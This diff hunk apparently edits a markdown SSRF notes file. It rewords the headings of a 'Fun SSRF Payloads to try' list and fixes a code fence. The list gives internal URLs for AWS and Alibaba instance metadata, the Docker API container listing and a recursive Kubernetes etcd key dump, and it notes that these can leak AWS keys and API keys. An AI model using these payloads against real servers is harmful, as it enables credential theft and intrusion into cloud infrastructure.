@@ -36,30 +36,28 @@ Files - The attacker may be able to read files using file:// URIs The attacker m
 
 Fun SSRF Payloads to try....
 
-AWS
+AWS - IAM role will leak AWS key
 
 ```
 http://169.254.169.254/latest/user-data/
 ```
 
-If iam is present then its party time you can get AWS keys.
-
 Alibaba
 
 ```
 http://100.100.100.200/latest/meta-data/
-``
+```
 
-Docker
+Docker - List Containers
 
 ```
 http://127.0.0.1:2375/v1.24/containers/json
 ```
-List Containers
 
 
 
-Kubernetes ETCD
+
+Kubernetes ETCD - Can contain API keys and internal ip and ports
 
 ```
 http://127.0.0.1:2379/v2/keys/?recursive=true
